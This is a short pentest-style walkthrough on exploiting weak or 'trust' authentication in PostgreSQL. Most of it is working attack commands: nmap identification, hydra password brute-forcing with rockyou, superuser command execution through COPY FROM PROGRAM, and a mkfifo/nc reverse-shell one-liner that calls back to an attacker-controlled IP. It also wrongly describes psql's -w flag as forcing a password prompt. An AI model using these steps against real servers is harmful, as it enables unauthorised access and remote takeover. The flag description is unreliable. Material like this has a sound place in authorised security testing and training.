PostgreSQL Weak Authentication

Theory & Background
PostgreSQL can use various authentication methods defined in its pg_hba.conf file. A common misconfiguration is using trust authentication for all connections or for specific users/databases. This allows anyone to connect to the database without a password, often with high privileges. Weak or default passwords (e.g., postgres:postgres) are also a major issue.

Step-by-Step Walkthrough
1. Identification
bash
nmap -p5432 -sV --script pgsql-info <target_ip>
Expected Result: Nmap will confirm the service and version. To test for authentication, you need to try to connect.

2. Exploitation
bash
# 1. Attempt a connection with common credentials
psql -h <target_ip> -U postgres -W  # It will prompt for password

# 2. Brute-forcing (with hydra)
hydra -l postgres -P /usr/share/wordlists/rockyou.txt <target_ip> postgres

# 3. If 'trust' authentication is misconfigured, you can connect without a password:
psql -h <target_ip> -U postgres -w
# The -w flag forces a password prompt, but if auth is 'trust', it will be bypassed.

# 4. Once connected, you can escalate to command execution.
# Check if you are a superuser:
SELECT usename, usesuper FROM pg_user;

# If you are superuser, use these functions for RCE:
# Example: Create a table that writes a file
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

# To get a reverse shell:
COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip> 4444 >/tmp/f';
What to do: Use the COPY FROM PROGRAM or \o meta-command to execute system commands and gain a foothold on the underlying server.
